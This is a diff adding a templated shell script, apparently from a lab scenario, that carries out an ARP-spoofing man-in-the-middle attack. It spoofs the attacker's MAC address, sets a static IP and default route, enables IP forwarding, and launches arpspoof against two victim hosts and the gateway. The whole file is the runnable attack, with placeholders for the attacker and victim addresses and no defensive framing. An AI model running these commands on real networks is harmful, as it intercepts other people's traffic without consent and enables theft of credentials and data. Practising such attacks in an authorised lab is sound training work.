@@ -1,0 +1,21 @@
+sudo su
+
+# 1. Set attacker MAC (from scenario)
+ip link set eth0 down
+ip link set eth0 address {{attacker_mac}}
+ip link set eth0 up
+
+# 2. Set static IP in subnet
+ip addr flush dev eth0
+ip addr add {{attacker_ip}}/{{prefix}} dev eth0
+ip route add default via {{gateway_ip}}
+
+# 3. Enable IP forwarding (traffic passes through attacker)
+echo 1 > /proc/sys/net/ipv4/ip_forward
+
+# 4. Verify MAC is set correctly
+ip link show eth0
+
+# 5. Launch ARP spoofing toward both victims
+arpspoof -i eth0 -t {{victim1_ip}} {{gateway_ip}} &
+arpspoof -i eth0 -t {{victim2_ip}} {{gateway_ip}} &
